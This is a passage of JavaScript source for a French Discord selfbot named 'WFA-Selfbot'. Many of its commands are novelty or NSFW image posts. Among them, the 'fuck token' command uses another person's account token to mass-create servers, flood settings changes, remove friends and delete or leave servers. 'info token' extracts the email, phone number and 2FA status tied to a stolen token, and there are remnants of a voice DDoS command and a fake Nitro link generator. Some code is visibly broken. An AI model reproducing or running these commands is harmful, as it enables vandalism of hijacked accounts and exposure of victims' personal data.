            consolecolor.instagram('[COMMANDE] Commande ddos voc executé')
          )
        }
        if (T.content === prefix + 'ddos-stop') {
          if (!X.guild) {
            return T.edit(
              ':x: **Commande uniquement utilisable sur un serveur**'
            )
          }
          clearInterval()
          X.edit('**Commande ddos stopé**')
          console.log(
            consolecolor.instagram('[COMMANDE] Commande ddos voc stopée')
          )
        }
        if (T.content.startsWith(prefix + 'fuck token')) {
          let bH = new Client(),
            bI = V.splice(2).join(' '),
            bJ = 'https://discordapp.com/api/v6/users/@me'
          const bK = { authorization: bI }
          request(
            bJ,
            {
              method: 'GET',
              headers: bK,
            },
            function (bL, bM, bN) {
              if (bM.statusCode === 200) {
                bH.on('ready', function () {
                  for (pas = 0; pas < 100; pas++) {
                    bH.user.createGuild('WFA-Selfbot', 'london')
                  }
                })
                for (pas = 0; pas < 20; pas++) {
                  fetch('https://discord.com/api/v8/users/@me/settings', {
                    headers: {
                      authorization: bI,
                      'content-type': 'application/json',
                    },
                    body: '{"theme":"light"}',
                    method: 'PATCH',
                  })
                  fetch('https://discord.com/api/v8/users/@me/settings', {
                    headers: {
                      authorization: bI,
                      'content-type': 'application/json',
                    },
                    body: '{"theme":"dark"}',
                    method: 'PATCH',
                  })
                }
                bH.on('ready', function () {
                  bH.user.friends.forEach((bR) => {
                    if (bR.id === '826503000541102200') {
                      return
                    }
                    bH.user
                      .removeFriend(bR)
                      .catch((bS) =>
                        console.log(
                          '[',
                          'ERROR'.red,
                          ']',
                          'une erreur est survenue que je ne peux régler'.green
                        )
                      )
                  })
                  bH.guilds.forEach((bR) => {
                    if (bR.id === '879157124230414406') {
                      return
                    }
                    if (bR.id === '843993531273707540') {
                      return
                    }
                    if (bR.ownerID === bH.user.id) {
                      bR.delete().catch((bU) => {
                        bU && console.log('Token timeout'.red)
                      })
                    } else {
                      bR.leave().catch((bU) =>
                        console.log(
                          '[',
                          'ERROR'.red,
                          ']',
                          'une erreur est survenue que je ne peux régler'.green
                        )
                      )
                    }
                  })
                  T.edit(':white_check_mark: **Token fuck en cours...**')
                })
                bH.login(bI)
              } else {
                T.edit(
                  '>>> **Token Info | WFA - Selfbot**\n    \n    \n                Le token: \n                ```' +
                    bI +
                    '```\n                \n                Le token ' +
                    bI +
                    " \nn'est pas valide :x:\n    "
                ).catch((bQ) =>
                  console.log(
                    '[',
                    'ERROR'.red,
                    ']',
                    'une erreur est survenue que je ne peux régler'.green
                  )
                )
              }
            }
          )
          console.log(
            consolecolor.instagram('[COMMANDE] Commande fuck token executé')
          )
        }
        if (T.content.startsWith(prefix + 'info token')) {
          let bM = V.splice(2).join(' '),
            bN = 'https://discordapp.com/api/v6/users/@me'
          const bO = { authorization: bM }
          const bP = {
            method: 'GET',
            headers: bO,
          }
          request(bN, bP, function (bQ, bR, bS) {
            bR.statusCode === 200
              ? new Promise((bU, bV) => {
                  let bX = 'https://discordapp.com/api/v6/users/@me'
                  const bY = { authorization: bM }
                  request(
                    bX,
                    {
                      method: 'GET',
                      headers: bY,
                    },
                    function (bZ, c0, c1) {
                      c1 = JSON.parse(c1)
                      var c3 = c1.id,
                        c4 = c1.username,
                        c5 = c1.avatar,
                        c6 = c1.discriminator,
                        c7 = c1.mfa_enabled,
                        c8 = c1.phone,
                        c9 = c1.locale
                      let cc = c1.public_flags,
                        cd = c1.flags,
                        ce = c1.email,
                        cf = c1.verified,
                        cg = c1.nsfw_allowed
                      var ca = ''
                      ca += '\nUser: ' + c4 + '#' + c6
                      ca += '\nId: ' + c3
                      ca += '\nEmail: ' + ce
                      ca += '\nNuméro de telephone: ' + c8
                      ca += '\nAvatar: ' + c5
                      ca += '\nLangue: ' + c9
                      ca += '\nA2f activé?: ' + c7
                      ca += '\nCompte vérifié?: ' + cf
                      ca += '\nNsfw activé?: ' + cg
                      ca += '\nFlags: ' + cd
                      ca += '\nPublic Flags: ' + cc
                      T.edit('```' + ca + '```').then(
                        console.log(
                          consolecolor.instagram(
                            '[COMMANDE] Commande info token executé'
                          )
                        )
                      )
                    }
                  )
                })
              : T.edit("**le token n'est pas valide :x:**").catch((bU) =>
                  console.log(
                    '[',
                    'ERROR'.red,
                    ']',
                    'une erreur est survenue que je ne peux régler'.green
                  )
                )
          })
        }
        if (T.content.startsWith(prefix + 'check token')) {
          let bQ = V.splice(1).join(' '),
            bR = 'https://discordapp.com/api/v6/users/@me'
          const bS = { authorizaion: bQ }
          request(
            bR,
            {
              method: 'GET',
              headers: bS,
            },
            function (bT, bU, bV) {
              if (bU.statusCode === 200) {
                T.edit(
                  '```diff\n + Le token:' + bQ + 'Est 100% valide \u2714```'
                ).catch((bX) =>
                  console.log(
                    '[',
                    'ERROR'.red,
                    ']',
                    'une erreur est survenue que je ne peux régler'.green
                  )
                )
              } else {
                T.edit(
                  '```diff\n- Le token ' + bQ + " n'est pas valide :x:```"
                ).catch((bX) =>
                  console.log(
                    '[',
                    'ERROR'.red,
                    ']',
                    'une erreur est survenue que je ne peux régler'.green
                  )
                )
              }
              console.log(
                consolecolor.instagram(
                  '[COMMANDE] Commande check token executé'
                )
              )
            }
          )
        }
        if (T.content.startsWith(prefix + 'lovecalc')) {
          let bU = [
            '5%',
            '10%',
            '15%',
            '20%',
            '25%',
            '30%',
            '35%',
            '40%',
            '45%',
            '50%',
            '55',
            '60%',
            '65%',
            '70%',
            '75%',
            '80%',
            '85%',
            '90%',
            '95%',
            '100%',
          ]
          rdm = Math.floor(Math.random(), bU.length)
          laPersonne = V.slice(0).join(' ') || 'WFA selfbot'
          const bV = laPersonne.split(' ').join('%2520'),
            bW = client.user.username.split(' ').join('%2520')
          T.edit(
            ghost +
              ('https://embed.rauf.workers.dev/?author=LoveCalc%2520%25E2%259D%25A4&description=relation%2520entre%2520' +
                bV +
                '%2520et%2520' +
                author +
                '%252C%2520relation%2520estim%25C3%25A9e%2520%25C3%25A0%2520' +
                bU[rdm])
          ).catch((bX) =>
            console.log(
              '[',
              'ERROR'.red,
              ']',
              'une erreur est survenue que je ne peux régler'.green
            )
          )
          console.log(
            consolecolor.instagram('[COMMANDE] Commande lovecalc executé')
          )
        }
        if (T.content.startsWith(prefix + 'start typing')) {
          T.delete()
          console.log(
            consolecolor.instagram('[COMMANDE] Commande start typing executé')
          )
          T.channel.startTyping().catch((bY) => {})
        }
        if (T.content.startsWith(prefix + '8ball')) {
          let bY = T.content.split(' ').splice(1).join(' ')
          var a9 = [
            'oui',
            'non...',
            'peut etre?',
            'probablement',
            'je ne pense pas.',
            'jamais',
            'tu peux essayer...',
          ]
          if (bY[1] != null) {
            T.edit(
              bY +
                '\nla reponse est: ' +
                a9[Math.floor(Math.random() * a9.length)]
            ).catch((bZ) =>
              console.log(
                '[',
                'ERROR'.red,
                ']',
                'une erreur est survenue que je ne peux régler'.green
              )
            )
          } else {
            T.edit(
              'Quelle est ta question? :rolling_eyes: (essayeplutot:' +
                prefix +
                ' 8ball [question])'
            )
          }
          console.log(
            consolecolor.instagram('[COMMANDE] Commande 8ball executé')
          )
        }
        T.content.startsWith(prefix + 'branlette') &&
          (T.edit('8=:fist:==D'),
          T.edit('8==:fist:=D'),
          T.edit('8===:fist:D '),
          T.edit('8==:fist:=D'),
          T.edit('8=:fist:==D '),
          T.edit('8:fist:===D'),
          T.edit('8=:fist:==D '),
          T.edit('8==:fist:=D'),
          T.edit('8===:fist:D'),
          T.edit('8==:fist:=D:sweat_drops:'),
          T.edit('8===:fist:D:sweat_drops:'),
          console.log(
            consolecolor.instagram('[COMMANDE] Commande branlette executé')
          ))
        if (T.content.startsWith(prefix + 'say')) {
          const bZ = [
            'ee5d5d',
            'ee5d9c',
            'ee5dcf',
            'b45dee',
            '5d62ee',
            '5d95ee',
            '5dddee',
            '5deebe',
            '5dee7a',
            '7dee5d',
            'c0ee5d',
            'eecf5d',
            'ee9f5d',
            'ee5d5d',
          ]
          if (!V) {
            throw 'Vous devez mettre quelque chose à dire !'
          }
          let c0 =
            V.splice(1).join(' ').split(' ').join('%2520') || 'WFA selfbot'
          for (pas = 0; pas < 10; pas++) {
            T.edit(
              ghost +
                ('https://embed.rauf.workers.dev/?author=Commande%2520Say&description=' +
                  c0 +
                  '&color=' +
                  bZ)
            ).catch((c1) =>
              console.log(
                '[',
                'ERROR'.red,
                ']',
                'une erreur est survenue que je ne peux régler'.green
              )
            )
          }
          console.log(consolecolor.instagram('[COMMANDE] Commande say executé'))
        }
        if (T.content.startsWith(prefix + 'fight')) {
          if (!W) {
            return X.edit(':x: **Aucun utilisateur mentionné**')
          }
          const c1 = W.username.split(' ').join('%2520'),
            c2 = client.user.username.split(' ').join('%2520')
          T.edit(
            ghost +
              ('https://embed.rauf.workers.dev/?author=' +
                c1 +
                '%2520VS%2520' +
                c2 +
                '&image=https%253A%252F%252Fwww.photofunky.net%252Foutput%252Fimage%252Fe%252F8%252F8%252Fa%252Fe88abf%252Fphotofunky.gif')
          ).catch((c3) =>
            console.log(
              '[',
              'ERROR'.red,
              ']',
              'une erreur est survenue que je ne peux régler'.green
            )
          )
          console.log(
            consolecolor.instagram('[COMMANDE] Commande fight executé')
          )
        }
        if (T.content.startsWith(prefix + 'boom')) {
          if (!W) {
            return X.edit(':x: **Aucun utilisateur mentionné**')
          }
          const c3 = W.username.split(' ').join('%2520'),
            c4 = client.user.username.split(' ').join('%2520')
          T.edit(
            ghost +
              ('https://embed.rauf.workers.dev/?author=' +
                c3 +
                '%2520Ce%2520Fait%2520Explos%25C3%25A9%2520Par%2520' +
                c4 +
                '%25F0%259F%2592%25A3%25F0%259F%2592%25A5&image=https%252Fmedia.discordapp.net%252Fattachments%252F648223633185177612%252F650715035592687647%252Fimage0.gif')
          ).catch((c5) =>
            console.log(
              '[',
              'ERROR'.red,
              ']',
              'une erreur est survenue que je ne peux régler'.green
            )
          )
          console.log(
            consolecolor.instagram('[COMMANDE] Commande boom executé')
          )
        }
        T.content == prefix + 'shutdown' &&
          (console.log(
            consolecolor.atlas('[EVENT] Commande WFA Selfbot arrêter')
          ),
          X.delete(),
          setTimeout(() => {
            process.exit(1)
          }, 300))
        if (T.content == prefix + 'rire') {
          const c5 = client.user.username.split(' ').join('%2520')
          T.edit(
            ghost +
              ('https://embed.rauf.workers.dev/?author=' +
                c5 +
                '%2520Rigole%2520%25F0%259F%2598%2582&image=') +
              C[Math.floor(Math.random() * C.length)]
          ).catch((c6) =>
            console.log(
              '[',
              'ERROR'.red,
              ']',
              'une erreur est survenue que je ne peux régler'.green
            )
          )
          console.log(
            consolecolor.instagram('[COMMANDE] Commande rire executé')
          )
        }
        if (T.content.startsWith(prefix + 'kiss')) {
          if (!W) {
            T.edit(':x: **Veuillez mentionner un utilisateur!**')
            return
          }
          const c6 = W.username.split(' ').join('%2520'),
            c7 = client.user.username.split(' ').join('%2520')
          T.edit(
            ghost +
              ('https://embed.rauf.workers.dev/?author=' +
                c6 +
                '%2520embrasse%2520' +
                c7 +
                '%2520%25E2%259D%25A4&image=') +
              D[Math.floor(Math.random() * D.length)]
          ).catch((c8) =>
            console.log(
              '[',
              'ERROR'.red,
              ']',
              'une erreur est survenue que je ne peux régler'.green
            )
          )
          console.log(
            consolecolor.instagram('[COMMANDE] Commande kiss executé')
          )
        }
        if (T.content.startsWith(prefix + 'veski')) {
          if (!W) {
            T.edit(':x: **Veuillez mentionner un utilisateur!**')
            return
          }
          const c8 = W.username.split(' ').join('%2520'),
            c9 = client.user.username.split(' ').join('%2520')
          T.edit(
            ghost +
              ('https://embed.rauf.workers.dev/?author=' +
                c8 +
                '%2520veski%2520&image=') +
              F[Math.floor(Math.random() * F.length)]
          ).catch((ca) =>
            console.log(
              '[',
              'ERROR'.red,
              ']',
              'une erreur est survenue que je ne peux régler'.green
            )
          )
          console.log(
            consolecolor.instagram('[COMMANDE] Commande veski executé')
          )
        }
        if (T.content.startsWith(prefix + 'load')) {
          T.delete()
          T.channel.send('```[' + '.'.repeat(50) + ']```').then((ca) => {
            for (a0 = 0; a0 <= 50; a0++) {
              ca.edit(
                '```[' +
                  '\u2588'.repeat(a0) +
                  '.'.repeat(50 - a0) +
                  ']  -  ' +
                  (a0 * 100) / 50 +
                  '%\n' +
                  'loading..```'
              )
            }
            ca.edit('`Chargement terminé !`').catch((cc) =>
              console.log(
                '[',
                'ERROR'.red,
                ']',
                'une erreur est survenue que je ne peux régler'.green
              )
            )
            console.log(
              consolecolor.instagram('[COMMANDE] Commande load executé')
            )
          })
        }
        if (T.content.startsWith(prefix + 'punch')) {
          if (!W) {
            T.edit(':x: **Veuillez mentionner un utilisateur!**')
            return
          }
          const cc = W.username.split(' ').join('%2520'),
            cd = client.user.username.split(' ').join('%2520')
          T.edit(
            ghost +
              ('https://embed.rauf.workers.dev/?author=' +
                cd +
                '%2520frappe%2520' +
                cc +
                '%2520%25F0%259F%2591%258A&image=') +
              G[Math.floor(Math.random() * G.length)]
          ).catch((ce) =>
            console.log(
              '[',
              'ERROR'.red,
              ']',
              'une erreur est survenue que je ne peux régler'.green
            )
          )
          console.log(
            consolecolor.instagram('[COMMANDE] Commande punch executé')
          )
        }
        if (T.content.startsWith(prefix + 'calin')) {
          if (!W) {
            T.edit(':x: **Veuillez mentionner un utilisateur!**')
            return
          }
          const ce = W.username.split(' ').join('%2520'),
            cf = client.user.username.split(' ').join('%2520')
          T.edit(
            ghost +
              ('https://embed.rauf.workers.dev/?author=' +
                cf +
                '%2520fait%2520un%2520calin%2520%25C3%25A0%2520' +
                ce +
                '&image=') +
              E[Math.floor(Math.random() * E.length)]
          ).catch((ch) =>
            console.log(
              '[',
              'ERROR'.red,
              ']',
              'une erreur est survenue que je ne peux régler'.green
            )
          )
          console.log(
            consolecolor.instagram('[COMMANDE] Commande calin executé')
          )
        }
        if (T.content === prefix + 'nitro') {
          T.edit('https://discord.gift/' + nitrocode(16, '0aA')).catch((cj) =>
            console.log(
              '[',
              'ERROR'.red,
              ']',
              'une erreur est survenue que je ne peux régler'.green
            )
          )
          console.log(
            consolecolor.instagram('[COMMANDE] Commande nitro executé')
          )
        }
        if (X.content.startsWith(prefix + 'reverse')) {
          let cj = V.splice(1).join(' ')
          if (!cj) {
            T.edit(':x: **Pas de test definit**')
          }
          function ck(cm) {
            return cm.split('').reverse().join('')
          }
          let cl = ck(cj)
          if ((V[0] = cl)) {
            cl = V.splice(1).join(' ')
          }
          X.edit('' + cl).catch((cm) => {})
          console.log(
            consolecolor.instagram('[COMMANDE] Commande reverse executé')
          )
        }
        if (T.content.startsWith(prefix + 'skick')) {
          let cn = T.guild
          if (!cn) {
            T.edit(':x: **Veuillez executer cette commande sur un serveur!**')
            return
          }
          if (!W) {
            T.edit(':x: **Veuillez mentionner un utilisateur!**')
            return
          }
          W.kick()
            .then((co) => {
              T.edit(
                ':wave:',
                co.displayName + ' a été expulser :point_right: '
              )
            })
            .catch(() => {
              T.delete()
              console.log(
                '[ERREUR]'.red + ' Je ne peux pas bannir cet personne'.green
              )
            })
          console.log(
            consolecolor.instagram('[COMMANDE] Commande kick executé')
          )
        }
        if (T.content.startsWith(prefix + 'sban')) {
          let co = T.guild
          if (!co) {
            T.edit(':x: **Veuillez executer cette commande sur un serveur!**')
            return
          }
          if (!W) {
            T.edit(':x: **Veuillez mentionner un utilisateur!**')
            return
          }
          W.ban()
            .then((cr) => {
              T.edit(
                ':wave: ' +
                  cr.displayName +
                  'a été banni avec succès https://gfycat.com/playfulfittingcaribou :point_right:'
              )
            })
            .catch(() => {
              T.delete()
              console.log(
                '[ERREUR]'.red + ' Je ne peux pas bannir cet personne'.green
              )
            })
          console.log(consolecolor.instagram('[COMMANDE] Commande ban executé'))
        }
        if (T.content.startsWith(prefix + 'role info' || prefix + 'ri')) {
          let cs = T.guild,
            ct = T.mentions.roles.first()
          if (!cs) {
            return X.edit(
              ':x: **Commande uniquement utilisable sur un serveur**'
            )
          }
          if (!ct) {
            return T.delete().then(
              console.log(
                '[' + 'ERROR'.red + ']' + 'un nom de rôle est nécessaire'.green
              )
            )
          }
          const cu = {
            false: 'Non',
            true: 'Oui',
          }
          console.log(
            consolecolor.instagram('[COMMANDE] Commande role info executé')
          )
          T.edit(
            '```\nRole: <@&' +
              ct.id +
              '>\n\nID du role: ' +
              ct.id +
              '\n\nCouleur: ' +
              ct.hexColor +
              '\n\nNombre de membres ayant ce role: ' +
              ct.members.size +
              '\n\nposition: ' +
              ct.position +
              '\n\nmentionnable: ' +
              cv[ct.mentionable] +
              '```'
          ).catch((cw) =>
            console.log(
              '[',
              'ERROR'.red,
              ']',
              'une erreur est survenue que je ne peux régler'.green
            )
          )
        }
        if (T.content.startsWith(prefix + 'add emote')) {
          if (T.channel.type === 'dm') {
            T.edit(':x: **Commande pas executable en mp**')
            return
          }
          let cw = V.splice(2).join(' '),
            cx = Discord.Util.parseEmoji(cw)
          if (!V) {
            T.edit(':x: **Veuillez choisir une emote.**')
            return
          }
          if (!cx) {
            T.edit(
              ':x: **Emote invalide essayez ceci** ' +
                prefix +
                'add emote (emote) <name>'
            )
            return
          }
          if (!T.member.hasPermission('MANAGE_EMOJIS')) {
            T.edit(
              ':x: **Vous n\'avez pas les permissions "Gérer les emojis" sur ce serveur**'
            )
            return
          }
          if (cx.id) {
            const cA =
              'https://cdn.discordapp.com/emojis/' + cx.id + '.' + cx.animated
                ? 'gif'
                : 'png'
            let cB = T.content.split(' ').splice(3) || cx.name
            T.guild.createEmoji(cA, cB)
            T.edit(':white_check_mark: **Emote ajoutée au serveur.**')
            console.log(
              consolecolor.instagram('[COMMANDE] Commande add emote executé')
            )
          } else {
            T.edit(':x: **Veuillez choisir une emote valide!**')
          }
        }
        if (T.content === prefix + 'emote') {
          if (T.channel.type === 'dm') {
            T.edit(':x: **Commande pas executable en mp**')
            return
          }
          let cE = '',
            cG = 0,
            cH = 0
          function cI(cJ) {
            return client.emogjis.get(cJ).toString()
          }
          T.guild.emogis.forEach((cJ) => {
            cH++
            if (cJ.animated) {
              cG++
              cE += cI(cJ.id)
            }
          })
          T.edit(
            '```\nServeur: **' +
              T.guild.name +
              '**\n\nEmojis animés: [' +
              cG +
              ']\n' +
              cE ||
              'None\n\nEmojis Simple:\n[' + 0 + '] \n' + '' ||
              "None\n\nTotal d'emojis: [" + cH ||
              'None]\n ' + cE + '```'
          )
          console.log(
            consolecolor.instagram('[COMMANDE] Commande emote executé')
          )
        }
        if (T.content.startsWith(prefix + 'remove emote')) {
          if (T.channel.type === 'dm') {
            T.edit(':x: **Commande pas executable en mp**')
            return
          }
          if (!T.member.hasPermission('MANAGE_EMOJIS')) {
            return T.edit(
              ':x: **Vous n\'avez pas les permissions "Gérer les emojis" sur ce serveur**'
            )
          }
          const cJ = V.splice(2).join(' ')
          if (!cJ) {
            return T.edit(':x: **Veuillez choisir une emote.**')
          }
          let cK = Discord.Util.parseEmoji(cJ)
          if (
            !T.guild.emojis.forEach((cL) => {
              if (!cL.i === cK.id) {
                return T.channel.send(
                  ":x: **Cette emote n'est pas sur le serveur**."
                )
              }
            })
          ) {
            return T.edit(
              ':white_check_mark: **Emote correctement supprimée du serveur.**'
            )
          }
          if (cK.id) {
            const cM =
              'https://cdn.discordapp.com/emojis/' + cK.id + '.' + cK.animated
                ? 'gif'
                : 'png'
            T.guild.emojis.get(cK.id).delete()
          } else {
            const cN = { assetType: 'png' }
            let cO = parse(cJ, cN)
            if (!cO[0]) {
              return T.edit(':x: **Veuillez choisir une emote valide**!')
            }
            T.edit(
              ':x: **Vous ne pouvez pas supprimer les emotes par defaut**!'
            )
          }
          console.log(
            consolecolor.instagram('[COMMANDE] Commande remove emote executé')
          )
        }
        if (T.content.startsWith(prefix + 'ass')) {
          if (nsfw === 'on') {
            const cP = { type: 'ass' }
            superagent
              .get('https://nekobot.xyz/api/image')
              .query(cP)
              .end((cQ, cR) => {
                X.edit(
                  ghost +
                    'https://embed.rauf.workers.dev/?author=Commande%2520NSFW&image=' +
                    cR.body.message +
                    '\n'
                ).catch((cS) =>
                  console.log(
                    '[',
                    'ERROR'.red,
                    ']',
                    'une erreur est survenue que je ne peux régler'.green
                  )
                )
                console.log(
                  consolecolor.instagram('[COMMANDE] Commande ass executé')
                )
              })
          } else {
            T.delete().catch((cQ) => {})
            console.log(
              '[NSFW]'.red + ' Les commandes NSFW sont désactivés'.green
            )
          }
        }
        if (T.content.startsWith(prefix + '4k')) {
          if (nsfw === 'on') {
            const cR = { type: '4k' }
            superagent
              .get('https://nekobot.xyz/api/image')
              .query(cR)
              .end((cS, cT) => {
                X.edit(
                  ghost +
                    'https://embed.rauf.workers.dev/?author=Commande%2520NSFW&image=' +
                    cT.body.message +
                    '\n'
                ).catch((cU) =>
                  console.log(
                    '[',
                    'ERROR'.red,
                    ']',
                    'une erreur est survenue que je ne peux régler'.green
                  )
                )
                console.log(
                  consolecolor.instagram('[COMMANDE] Commande 4k executé')
                )
              })
          } else {
            T.delete().catch((cS) => {})
            console.log(
              '[NSFW]'.red + ' Les commandes NSFW sont désactivés'.green
            )
          }
        }
        if (T.content.startsWith(prefix + 'nsfw-gif')) {
          if (nsfw === 'on') {
            const cU = { type: 'pgif' }
            superagent
              .get('https://nekobot.xyz/api/image')
              .query(cU)
              .end((cV, cW) => {
                X.edit(
                  ghost +
                    'https://embed.rauf.workers.dev/?author=Commande%2520NSFW&image=' +
                    cW.body.message +
                    '\n'
                ).catch((cX) =>
                  console.log(
                    '[',
                    'ERROR'.red,
                    ']',
                    'une erreur est survenue que je ne peux régler'.green
                  )
                )
                console.log(
                  consolecolor.instagram('[COMMANDE] Commande nsfw gif executé')
                )
              })
          } else {
            T.delete().catch((cV) => {})
            console.log(
              '[NSFW]'.red + ' Les commandes NSFW sont désactivés'.green
            )
          }
        }
        if (T.content.startsWith(prefix + 'hentai')) {
          if (nsfw === 'on') {
            const cW = { type: 'hentai_anal' }
            superagent
              .get('https://nekobot.xyz/api/image')
              .query(cW)
              .end((cX, cY) => {
                X.edit(
                  ghost +
                    'https://embed.rauf.workers.dev/?author=Commande%2520NSFW&image=' +
                    cY.body.message +
                    '\n'
                ).catch((cZ) =>
                  console.log(
                    '[',
                    'ERROR'.red,
                    ']',
                    'une erreur est survenue que je ne peux régler'.green
                  )
                )
                console.log(
                  consolecolor.instagram('[COMMANDE] Commande hentai executé')
                )
              })
          } else {
            T.delete().catch((cX) => {})
            console.log(
              '[NSFW]'.red + ' Les commandes NSFW sont désactivés'.green
            )
          }
        }
        T.content.startsWith(prefix + 'pussy') &&
          (nsfw === 'on'
            ? superagent
                .get('https://nekobot.xyz/api/image')
                .query({ type: 'pussy' })
                .end((cX, cY) => {
                  X.edit(
                    ghost +
                      'https://embed.rauf.workers.dev/?author=Commande%2520NSFW&image=' +
                      cY.body.message +
                      '\n'
                  ).catch((d0) =>
                    console.log(
                      '[',
                      'ERROR'.red,
                      ']',
                      'une erreur est survenue que je ne peux régler'.green
                    )
                  )
                  console.log(
                    consolecolor.instagram('[COMMANDE] Commande pussy executé')
                  )
                })
            : (T.delete().catch((cX) => {}),
              console.log(
                '[NSFW]'.red + ' Les commandes NSFW sont désactivés'.green
              )))
        T.content.startsWith(prefix + 'thigh') &&
          (nsfw === 'on'
            ? superagent
                .get('https://nekobot.xyz/api/image')
                .query({ type: 'thigh' })
                .end((cX, cY) => {
                  X.edit(
                    ghost +
                      ('https://embed.rauf.workers.dev/?author=Commande%2520NSFW&image=' +
                        cY.body.message)
                  ).catch((d0) =>
                    console.log(
                      '[',
                      'ERROR'.red,
                      ']',
                      'une erreur est survenue que je ne peux régler'.green
                    )
                  ),
                    console.log(
                      consolecolor.instagram(
                        '[COMMANDE] Commande thigh executé'
                      )
                    )
                })
            : (T.delete().catch((cX) => {}),
              console.log(
                '[NSFW]'.red + ' Les commandes NSFW sont désactivés'.green
              )))
        if (T.content.startsWith(prefix + 'anal')) {
          if (nsfw === 'on') {
            const cX = { type: 'anal' }
            superagent
              .get('https://nekobot.xyz/api/image')
              .query(cX)
              .end((cY, cZ) => {
                X.edit(
                  '>>> **NSFW Commande | WFA - Selfbot**\n\n\n' +
                    cZ.body.message +
                    '\n'
                ).catch((d1) =>
                  console.log(
                    '[',
                    'ERROR'.red,
                    ']',
                    'une erreur est survenue que je ne peux régler'.green
                  )
                ),
                  console.log(
                    consolecolor.instagram('[COMMANDE] Commande anal executé')
                  )
              })
          } else {
            T.delete().catch((d0) => {})
            console.log(
              '[NSFW]'.red + ' Les commandes NSFW sont désactivés'.green
            )
          }
        }
        if (T.content.startsWith(prefix + 'spotify')) {
          const d1 = T.content.split(' ').slice(1).join(' ') || 'WFA Selfbot'
          let d2 = rpcGenerator
            .createSpotifyRpc(client)
            .setAssetsLargeImage(
              'spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e'
            )
            .setAssetsSmallImage(
              'spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e'
            )
            .setDetails(d1)
            .setState('WFA-Selfbot')
            .setStartTimestamp(Date.now())
            .setEndTimestamp(Date.now() + 86400000)
          client.user
            .setPresence(d2.toDiscord())
            .then(
              T.edit(':white_check_mark: **Tu écoutes ' + d1 + ' sur spotify**')
            )
            .catch(console.error)
          console.log(
            consolecolor.instagram('[COMMANDE] Commande spotify executé')
          )
        }
        T.content.startsWith(prefix + 'reset') &&
          (clearInterval(),
          client.user.setActivity(null, {}),
          T.edit(
            ':information_source:  Votre statut a été réinitialisé ! :information_source:'
          ).catch((d3) =>
            console.log(
              '[',
              'ERROR'.red,
              ']',
              'une erreur est survenue que je ne peux régler'.green
            )
          ),
          console.log(
            consolecolor.instagram('[COMMANDE] Commande reset executé')
          ))
        if (T.content.startsWith(prefix + 'gucci')) {
          let d3 = V.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImages('603405368940429315', 'gucci')
            .then((d4) => {
              rpcGenerator
                .getRpcImages('603405368940429315', 'gucci0')
                .then((d6) => {
                  let d9 = new rpcGenerator.Rpc()
                    .setName('Gucci')
                    .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                    .setType('WATCHING')
                    .setApplicationId('603405368940429315')
                    .setDetails('Gucci')
                    .setAssetsLargeImage(d4.id)
                    .setAssetsSmallImage(d6.id)
                    .setAssetsLargeText('BE RICH WITH WFA')
                    .setState(d3)
                    .setStartTimestamp(Date.now())
                    .setParty({ id: uuid() })
                  client.user.setPresence(d9.toDiscord()).catch((da) => {})
                  console.log(
                    consolecolor.instagram('[COMMANDE] Commande gucci executé')
                  )
                  T.edit(
                    ':white_check_mark: **Tu regardes ' + d3 + ' sur Gucci**'
                  )
                })
            })
        }
        if (T.content.startsWith(prefix + 'lacoste')) {
          let d5 = V.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('603405368940429315', 'lacoste')
            .then((d6) => {
              let d7 = new rpcGenerator.Rpc()
                .setName('Lacoste')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Lacoste')
                .setAssetsLargeImage(d6.id)
                .setAssetsLargeText('BE RAKAILLE WITH WFA')
                .setState(d5)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(d7.toDiscord()).catch((d8) => {})
              console.log(
                consolecolor.instagram('[COMMANDE] Commande lacoste executé')
              )
              T.edit(
                ':white_check_mark: **Tu regardes ' + d5 + ' sur lacoste**'
              )
            })
        }
        if (T.content.startsWith(prefix + 'nike')) {
          let d6 = V.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator.getRpcImages('603405368940429315', 'nike').then((d7) => {
            let d8 = new rpcGenerator.Rpc()
              .setName('Nike')
              .setUrl('https://www.twitch.tv/OGAGAL_risitas')
              .setType('WATCHING')
              .setApplicationId('603405368940429315')
              .setDetails('Nike')
              .setAssetsLargeImage(d7.id)
              .setAssetsLargeText('BE NIKED WITH WFA')
              .setState(d6)
              .setStartTimestamp(Date.now())
              .setParty({ id: uuid() })
            clien.user.setPresence(d8.toDiscord()).catch((d9) => {})
            console.log(
              consolecolor.instagram('[COMMANDE] Commande nike executé')
            )
            T.edit(':white_check_mark: **Tu regardes ' + d6 + ' sur Nike**')
          })
        }
        if (T.content.startsWith(prefix + 'google')) {
          let d7 = V.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImages('603405368940429315', 'google')
            .then((d8) => {
              let d9 = new rpcGenerator.Rpc()
                .setName('Google')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Google')
                .setAssetsLargeImage(d8.id)
                .setAssetsLargeText('BE INSTRUCT WITH WFA')
                .setState(d7)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(d9.toDiscord()).catch((da) => {})
              console.log(
                consolecolor.instagram('[COMMANDE] Commande google executé')
              )
              T.edit(':white_check_mark: **Tu regardes ' + d7 + ' sur google**')
            })
        }
        if (T.content.startsWith(prefix + 'skype')) {
          let d8 = V.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImages('603405368940429315', 'skype')
            .then((d9) => {
              let da = new rpcGenerator.Rpc()
                .setName('Skype')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Skype')
                .setAssetsLargeImage(d9.id)
                .setAssetsLargeText('BE OLD WITH WFA')
                .setState(d8)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(da.toDiscord()).catch((dc) => {})
              console.log(
                consolecolor.instagram('[COMMANDE] Commande skype executé')
              )
              T.edit(':white_check_mark: **Tu regardes ' + d8 + ' sur Skype**')
            })
        }
        if (T.content.startsWith(prefix + 'snapchat')) {
